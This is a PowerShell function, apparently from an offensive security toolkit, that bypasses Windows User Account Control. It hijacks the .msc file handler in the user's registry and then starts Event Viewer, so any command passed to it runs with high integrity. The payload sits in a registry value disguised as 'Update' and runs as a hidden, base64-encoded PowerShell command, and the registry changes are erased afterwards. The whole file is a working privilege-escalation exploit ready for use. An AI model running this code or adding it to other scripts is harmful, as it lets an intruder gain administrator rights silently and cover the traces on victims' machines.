function Invoke-EventVwrBypass {
<#
.SYNOPSIS

Bypasses UAC by performing an image hijack on the .msc file extension
Expected to work on Win7, 8.1 and Win10

Only tested on Windows 7 and Windows 10

Author: Matt Nelson (@enigma0x3)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER Command

 Specifies the command you want to run in a high-integrity context. For example, you can pass it powershell.exe followed by any encoded command "powershell -enc <encodedCommand>"

.EXAMPLE

Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="

This will write out "Is Elevated: True" to C:\UACBypassTest.

#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
        "[!] Current user not a local administrator!"
        Throw ("Current user not a local administrator!")
    }
    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
        "[!] Not in a medium integrity process!"
        Throw ("Not in a medium integrity process!")
    }

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        #Begin Execution

        #Store the payload (due to eventvwr.exe length restrictions)
        $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
        $parts = $RegPath.split('\');
        $path = $RegPath.split("\")[0..($parts.count -2)] -join '\';
        $name = $parts[-1];
        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;

        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x'
        #Add in the new registry entries to hijack the msc file
        if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $mscCommandPath -Force |
                New-ItemProperty -Name '(Default)' -Value $launcherCommand -PropertyType string -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }

        if (Test-Path $mscCommandPath) {
            Write-Verbose "Created registry entries to hijack the msc extension"
        }else{
            Write-Warning "Failed to create registry key, exiting"
            exit
        }

        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
        #Start Event Viewer
        if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
            $Process = Start-Process -FilePath $EventvwrPath -PassThru
            Write-Verbose "Started eventvwr.exe"
        }

        #Sleep 5 seconds
        Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $mscfilePath = 'HKCU:\Software\Classes\mscfile'
        $PayloadPath = 'HKCU:Software\Microsoft\Windows'
        $PayloadKey = "Update"

        if (Test-Path $mscfilePath) {
            #Remove the registry entry
            Remove-Item $mscfilePath -Recurse -Force
            Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
            Write-Verbose "Removed registry entries"
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose "Killed running eventvwr process"
        }
    }
}
